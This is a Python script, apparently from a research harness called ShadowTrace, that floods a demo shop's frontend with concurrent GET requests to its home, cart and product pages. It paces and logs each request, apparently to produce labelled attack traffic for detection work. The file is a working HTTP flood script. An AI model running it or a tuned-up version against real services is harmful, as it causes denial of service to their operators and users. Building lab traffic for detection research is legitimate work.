"""HTTP flood: several workers request frontend pages in a tight loop.

All 9 product pages, the home page and the cart are cycled, so the product ID
alone does not identify the attack. Every request carries a client-chosen trace
ID, is recorded in origin.jsonl and uses the k6 User-Agent (see provenance.py).
"""

import os
import sys
import time
import argparse
import threading
from concurrent.futures import ThreadPoolExecutor

import requests

sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), ".."))
from provenance import Pacer, add_origin_args, origin_log_from_args, send  # noqa: E402

# cheap high-volume GETs that still fan out internally; all 9 products, so the
# product id is not a shortcut either
PRODUCT_IDS = ["OLJCESPC7Z", "66VCHSJNUP", "1YMWWN1N4O", "L9ECAV7KIM", "2ZYFJ3GM2N",
               "0PUK6V6EV0", "LS4PSXUNUM", "9SIQT8TOJO", "6E92ZMYYFZ"]
FLOOD_PATHS = ["/", "/cart"] + [f"/product/{p}" for p in PRODUCT_IDS]

STOP = threading.Event()


def worker(base_url, label, log, counters, pacer, idx):
    session = requests.Session()
    i = idx
    while not STOP.is_set():
        path = FLOOD_PATHS[i % len(FLOOD_PATHS)]
        i += 1
        try:
            r = send(session, "GET", base_url + path, log, label, timeout=5)
            counters["ok" if r.status_code < 500 else "err"] += 1
        except requests.RequestException:
            counters["err"] += 1
        pacer.sleep()


def main():
    p = argparse.ArgumentParser(description="ShadowTrace HTTP flood attack")
    p.add_argument("--duration", type=int, required=True, help="seconds to flood")
    p.add_argument("--url", default="http://localhost:8080", help="frontend base URL")
    p.add_argument("--concurrency", type=int, default=3, help="parallel flood workers")
    p.add_argument("--pause", type=float, default=0.15,
                   help="seconds between requests per worker (throttle so the cluster stays up)")
    p.add_argument("--label", default="http_flood", help="origin label in origin.jsonl")
    add_origin_args(p)
    args = p.parse_args()
    log = origin_log_from_args(args, client="http_flood")

    counters = {"ok": 0, "err": 0}
    start = time.time()
    print(f"[flood] {args.concurrency} workers -> {args.url} for {args.duration}s")

    with ThreadPoolExecutor(max_workers=args.concurrency) as pool:
        for idx in range(args.concurrency):
            pool.submit(worker, args.url, args.label, log, counters, Pacer(args.pause, args.jitter, args.rng_seed, idx), idx * 3)
        try:
            time.sleep(args.duration)
        finally:
            STOP.set()
    log.close()

    elapsed = time.time() - start
    total = counters["ok"] + counters["err"]
    print(f"[flood] done: {total} requests in {elapsed:.0f}s "
          f"(~{total/elapsed:.0f} req/s, {counters['err']} errors)")


if __name__ == "__main__":
    main()
